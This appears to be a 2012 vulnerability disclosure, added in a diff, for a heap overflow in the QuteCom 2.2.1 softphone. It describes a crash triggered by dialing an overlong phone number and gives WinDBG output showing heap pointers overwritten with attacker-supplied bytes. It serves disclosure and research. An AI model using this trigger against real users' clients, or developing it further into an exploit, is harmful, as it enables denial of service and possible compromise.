@@ -1,0 +1,209 @@
+# Title: Qutecom (Cross-platform, open source softphone) Heap Overflow DoS/Crash Proof of Concept
+# Date: 14th June 2012
+# Exploit Author: Debasish Mandal
+# Author's Blog : http://www.debasish.in/
+# Vendor Homepage: http://qutecom.org/
+# Software Link: http://trac.qutecom.org/downloads/QuteCom-2.2.1-setup-release.exe
+# Version: Version 2.2.1.
+# Tested on: Microsoft Windows XP Professional SP2 EN (32bit)
+
+=======
+Title =
+=======
+
+Qutecom Version 2.2.1 Heap Overflow DoS/Crash Proof of Concept
+
+==========
+Summary: =
+==========
+
+QuteCom (previously called WengoPhone) is a free software SIP compliant VoIP client developed by the QuteCom (previously OpenWengo) community under the GNU General Public License (GPL). It allows users to speak to other users of SIP compliant VoIP software at no cost.
+
+(Source :http://en.wikipedia.org/wiki/QuteCom)
+
+This bug in Qutecom v2.2.1 is caused due to a boundary error in the processing of too long phone number.This heap buffer overflow bug can be triggered by dialing a more than 5000 character phone number or character set form the soft phone.
+To trigger this bug the application must be connected to a VOIP/SIP server.An Asterisk-based PBX Phone System "TrixBox" was used to test this Crash.
+
+============
+Tested on: =
+============
+
+Tested with latest stable release http://trac.qutecom.org/downloads/QuteCom-2.2.1-setup-release.exe on Microsoft Windows XP Professional SP2 EN (32bit)
+An Asterisk-based PBX Phone System "TrixBox" was used as SIP server.
+
+=============================================================
+WinDBG Output After Feeding 5000 'A's into the application: =
+=============================================================
+
+Microsoft (R) Windows Debugger Version 6.12.0002.633 X86
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+Symbol search path is: c:\symbols\private;srv*c:\symbols\web*http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+ModLoad: 00400000 00789000   C:\Program Files\QuteCom\QuteCom.exe
+ModLoad: 7c900000 7c9b0000   C:\WINDOWS\system32\ntdll.dll
+ModLoad: 7c800000 7c8f4000   C:\WINDOWS\system32\kernel32.dll
+ModLoad: 10000000 10021000   C:\Program Files\QuteCom\owutil.dll
+ModLoad: 77e70000 77f01000   C:\WINDOWS\system32\RPCRT4.dll
+ModLoad: 77dd0000 77e6b000   C:\WINDOWS\system32\ADVAPI32.dll
+ModLoad: 7c9c0000 7d1d4000   C:\WINDOWS\system32\SHELL32.dll
+ModLoad: 77c10000 77c68000   C:\WINDOWS\system32\msvcrt.dll
+ModLoad: 77f10000 77f56000   C:\WINDOWS\system32\GDI32.dll
+ModLoad: 77d40000 77dd0000   C:\WINDOWS\system32\USER32.dll
+ModLoad: 77f60000 77fd6000   C:\WINDOWS\system32\SHLWAPI.dll
+ModLoad: 7c420000 7c4a7000   C:\WINDOWS\WinSxS\x86_Microsoft.VC80.CRT_1fc8b3b9a1e18e3b_8.0.50727.6195_x-ww_44262b86\MSVCP80.dll
+ModLoad: 78130000 781cb000   C:\WINDOWS\WinSxS\x86_Microsoft.VC80.CRT_1fc8b3b9a1e18e3b_8.0.50727.6195_x-ww_44262b86\MSVCR80.dll
+ModLoad: 00240000 0024d000   C:\Program Files\QuteCom\boost_thread-vc80-mt-1_34_1.dll
+ModLoad: 00260000 00275000   C:\Program Files\QuteCom\webcam.dll
+ModLoad: 76b40000 76b6d000   C:\WINDOWS\system32\WINMM.dll
+ModLoad: 774e0000 7761c000   C:\WINDOWS\system32\ole32.dll
+ModLoad: 77120000 771ac000   C:\WINDOWS\system32\OLEAUT32.dll
+ModLoad: 00290000 0029f000   C:\Program Files\QuteCom\boost_signals-vc80-mt-1_34_1.dll
+ModLoad: 01120000 014a4000   C:\Program Files\QuteCom\avcodec-51.dll
+ModLoad: 002b0000 002bb000   C:\Program Files\QuteCom\avutil-49.dll
+ModLoad: 002c0000 002d0000   C:\Program Files\QuteCom\owsl.dll
+ModLoad: 002e0000 002e7000   C:\Program Files\QuteCom\owbase.dll
+ModLoad: 00300000 0030b000   C:\Program Files\QuteCom\pthread.dll
+ModLoad: 71ab0000 71ac7000   C:\WINDOWS\system32\WS2_32.dll
+ModLoad: 71aa0000 71aa8000   C:\WINDOWS\system32\WS2HELP.dll
+ModLoad: 00320000 00349000   C:\Program Files\QuteCom\curl.dll
+ModLoad: 014b0000 0157c000   C:\Program Files\QuteCom\LIBEAY32.dll
+ModLoad: 71ad0000 71ad9000   C:\WINDOWS\system32\WSOCK32.dll
+ModLoad: 7c360000 7c3b6000   C:\Program Files\QuteCom\MSVCR71.dll
+ModLoad: 00360000 00386000   C:\Program Files\QuteCom\SSLEAY32.dll
+ModLoad: 76d60000 76d79000   C:\WINDOWS\system32\iphlpapi.dll
+ModLoad: 67000000 671e1000   C:\Program Files\QuteCom\QtCore4.dll
+ModLoad: 65000000 6573d000   C:\Program Files\QuteCom\QtGui4.dll
+ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\comdlg32.dll
+ModLoad: 5d090000 5d127000   C:\WINDOWS\system32\COMCTL32.dll
+ModLoad: 76390000 763ad000   C:\WINDOWS\system32\IMM32.dll
+ModLoad: 73000000 73026000   C:\WINDOWS\system32\WINSPOOL.DRV
+ModLoad: 64000000 640da000   C:\Program Files\QuteCom\QtNetwork4.dll
+ModLoad: 61000000 61054000   C:\Program Files\QuteCom\QtXml4.dll
+ModLoad: 66000000 66041000   C:\Program Files\QuteCom\QtSvg4.dll
+ModLoad: 01580000 01e49000   C:\Program Files\QuteCom\QtWebKit4.dll
+ModLoad: 77c00000 77c08000   C:\WINDOWS\system32\VERSION.dll
+ModLoad: 01e50000 01e8f000   C:\Program Files\QuteCom\phonon4.dll
+ModLoad: 01e90000 01e98000   C:\Program Files\QuteCom\psiidle.dll
+ModLoad: 771b0000 77256000   C:\WINDOWS\system32\WININET.dll
+ModLoad: 77a80000 77b14000   C:\WINDOWS\system32\CRYPT32.dll
+ModLoad: 77b20000 77b32000   C:\WINDOWS\system32\MSASN1.dll
+ModLoad: 77260000 772fc000   C:\WINDOWS\system32\urlmon.dll
+ModLoad: 01eb0000 01ec0000   C:\Program Files\QuteCom\portaudio.dll
+ModLoad: 01ed0000 01f07000   C:\Program Files\QuteCom\boost_serialization-vc80-mt-1_34_1.dll
+ModLoad: 01f20000 01f5c000   C:\Program Files\QuteCom\boost_program_options-vc80-mt-1_34_1.dll
+ModLoad: 01f70000 02024000   C:\Program Files\QuteCom\glib.dll
+ModLoad: 02040000 0204b000   C:\Program Files\QuteCom\intl.dll
+ModLoad: 02050000 02129000   C:\Program Files\QuteCom\iconv.dll
+ModLoad: 02130000 02138000   C:\Program Files\QuteCom\gthread.dll
+ModLoad: 02150000 02275000   C:\Program Files\QuteCom\libpurple.dll
+ModLoad: 02290000 022be000   C:\Program Files\QuteCom\gobject.dll
+ModLoad: 66780000 66ad5000   C:\Program Files\QuteCom\libgnutls-26.dll
+ModLoad: 022d0000 02586000   C:\Program Files\QuteCom\libgcrypt-11.dll
+ModLoad: 02590000 02663000   C:\Program Files\QuteCom\libgpg-error-0.dll
+ModLoad: 02670000 02760000   C:\Program Files\QuteCom\libxml2.dll
+ModLoad: 02760000 02772000   C:\Program Files\QuteCom\zlib1.dll
+ModLoad: 02780000 02811000   C:\Program Files\QuteCom\phapi.dll
+ModLoad: 02830000 02837000   C:\Program Files\QuteCom\phapiutil.dll
+ModLoad: 773d0000 774d2000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.2180_x-ww_a84f1ff9\comctl32.dll
+ModLoad: 02eb0000 02ede000   C:\Program Files\ProxyFirewall\PFW.dll
+ModLoad: 5ad70000 5ada8000   C:\WINDOWS\system32\uxtheme.dll
+ModLoad: 77d00000 77d33000   C:\WINDOWS\system32\netman.dll
+ModLoad: 76400000 765a6000   C:\WINDOWS\system32\netshell.dll
+ModLoad: 76e80000 76e8e000   C:\WINDOWS\system32\rtutils.dll
+ModLoad: 76c00000 76c2e000   C:\WINDOWS\system32\credui.dll
+ModLoad: 76b20000 76b31000   C:\WINDOWS\system32\ATL.DLL
+ModLoad: 76d40000 76d58000   C:\WINDOWS\system32\MPRAPI.dll
+ModLoad: 77cc0000 77cf2000   C:\WINDOWS\system32\ACTIVEDS.dll
+ModLoad: 76e10000 76e35000   C:\WINDOWS\system32\adsldpc.dll
+ModLoad: 5b860000 5b8b4000   C:\WINDOWS\system32\NETAPI32.dll
+ModLoad: 76f60000 76f8c000   C:\WINDOWS\system32\WLDAP32.dll
+ModLoad: 71bf0000 71c03000   C:\WINDOWS\system32\SAMLIB.dll
+ModLoad: 77920000 77a13000   C:\WINDOWS\system32\SETUPAPI.dll
+ModLoad: 76ee0000 76f1c000   C:\WINDOWS\system32\RASAPI32.dll
+ModLoad: 76e90000 76ea2000   C:\WINDOWS\system32\rasman.dll
+ModLoad: 76eb0000 76edf000   C:\WINDOWS\system32\TAPI32.dll
+ModLoad: 77fe0000 77ff1000   C:\WINDOWS\system32\Secur32.dll
+ModLoad: 77620000 7768e000   C:\WINDOWS\system32\WZCSvc.DLL
+ModLoad: 76d30000 76d34000   C:\WINDOWS\system32\WMI.dll
+ModLoad: 76d80000 76d9e000   C:\WINDOWS\system32\DHCPCSVC.DLL
+ModLoad: 76f20000 76f47000   C:\WINDOWS\system32\DNSAPI.dll
+ModLoad: 76f50000 76f58000   C:\WINDOWS\system32\WTSAPI32.dll
+ModLoad: 76360000 76370000   C:\WINDOWS\system32\WINSTA.dll
+ModLoad: 606b0000 607bd000   C:\WINDOWS\system32\ESENT.dll
+ModLoad: 73030000 73040000   C:\WINDOWS\system32\WZCSAPI.DLL
+ModLoad: 71a50000 71a8f000   C:\WINDOWS\System32\mswsock.dll
+ModLoad: 662b0000 66308000   C:\WINDOWS\system32\hnetcfg.dll
+ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll
+ModLoad: 76fb0000 76fb8000   C:\WINDOWS\System32\winrnr.dll
+ModLoad: 76fc0000 76fc6000   C:\WINDOWS\system32\rasadhlp.dll
+ModLoad: 03420000 03429000   C:\Program Files\QuteCom\imageformats\qgif4.dll
+ModLoad: 03440000 03461000   C:\Program Files\QuteCom\imageformats\qjpeg4.dll
+ModLoad: 03480000 034b9000   C:\Program Files\QuteCom\imageformats\qmng4.dll
+ModLoad: 034d0000 034d8000   C:\Program Files\QuteCom\imageformats\qsvg4.dll
+ModLoad: 034f0000 03537000   C:\Program Files\QuteCom\imageformats\qtiff4.dll
+ModLoad: 769c0000 76a73000   C:\WINDOWS\system32\userenv.dll
+ModLoad: 76c30000 76c5e000   C:\WINDOWS\system32\WINTRUST.dll
+ModLoad: 76c90000 76cb8000   C:\WINDOWS\system32\IMAGEHLP.dll
+ModLoad: 72d20000 72d29000   C:\WINDOWS\system32\wdmaud.drv
+ModLoad: 72d10000 72d18000   C:\WINDOWS\system32\msacm32.drv
+ModLoad: 77be0000 77bf5000   C:\WINDOWS\system32\MSACM32.dll
+ModLoad: 77bd0000 77bd7000   C:\WINDOWS\system32\midimap.dll
+ModLoad: 20000000 202c5000   C:\WINDOWS\system32\xpsp2res.dll
+ModLoad: 0ffd0000 0fff8000   C:\WINDOWS\system32\rsaenh.dll
+ModLoad: 03560000 0356d000   C:\Program Files\QuteCom\sfp-plugin.dll
+ModLoad: 76fd0000 7704f000   C:\WINDOWS\system32\CLBCATQ.DLL
+ModLoad: 77050000 77115000   C:\WINDOWS\system32\COMRes.dll
+ModLoad: 75f40000 75f51000   C:\WINDOWS\system32\devenum.dll
+ModLoad: 736b0000 736b7000   C:\WINDOWS\system32\msdmo.dll
+ModLoad: 76780000 76789000   C:\WINDOWS\system32\shfolder.dll
+ModLoad: 09a80000 09a87000   C:\Program Files\Internet Download Manager\idmmkb.dll
+ModLoad: 0b890000 0b8a8000   C:\Program Files\QuteCom\phapi-plugins\phspeexplugin.dll
+ModLoad: 0a560000 0a574000   C:\PROGRA~1\INVISI~1\keycapt.dll
+ModLoad: 73080000 7309c000   C:\WINDOWS\system32\rsvpsp.dll
+ModLoad: 68100000 68124000   C:\WINDOWS\system32\dssenh.dll
+ModLoad: 77b40000 77b62000   C:\WINDOWS\system32\Apphelp.dll
+(9b4.f38): Access violation - code c0000005 (!!! second chance !!!)
+eax=41414141 ebx=02d70000 ecx=085d87d8 edx=02d70478 esi=085d87d0 edi=41414141
+eip=7c9111de esp=0b88fb94 ebp=0b88fdb4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000202
+ntdll!RtlAllocateHeap+0x567:
+7c9111de 8b10            mov     edx,dword ptr [eax]  ds:0023:41414141=????????  
+
+
+0:000> r
+eax=41414141 ebx=02d70000 ecx=0860efc0 edx=02d70178 esi=0860efb8 edi=41414141
+eip=7c9111de esp=0111d42c ebp=0111d64c iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000216
+ntdll!RtlAllocateHeap+0x567:
+7c9111de 8b10            mov     edx,dword ptr [eax]  ds:0023:41414141=????????
+
+
+0:000> d esi
+0860efb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0860efc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0860efd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0860efe8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0860eff8  41 41 41 41 41 41 41 41-?? ?? ?? ?? ?? ?? ?? ??  AAAAAAAA????????
+
+
+0:000> u 7c9111de
+ntdll!RtlAllocateHeap+0x567:
+7c9111de 8b10            mov     edx,dword ptr [eax]
+7c9111e0 3b5704          cmp     edx,dword ptr [edi+4]
+7c9111e3 0f858c310200    jne     ntdll!RtlAllocateHeap+0x579 (7c934375)
+7c9111e9 3bd1            cmp     edx,ecx
+7c9111eb 0f8584310200    jne     ntdll!RtlAllocateHeap+0x579 (7c934375)
+7c9111f1 8938            mov     dword ptr [eax],edi
+7c9111f3 894704          mov     dword ptr [edi+4],eax
+7c9111f6 3bf8            cmp     edi,eax
+
+==============
+Vedor Report =
+==============
+
+I have sent several notifications to qutecom on this bug in this application but I havn't got any response.
+
+Bug Ticket :http://qutecom.org/ticket/399
+mail to : qutecom-dev@lists.qutecom.org
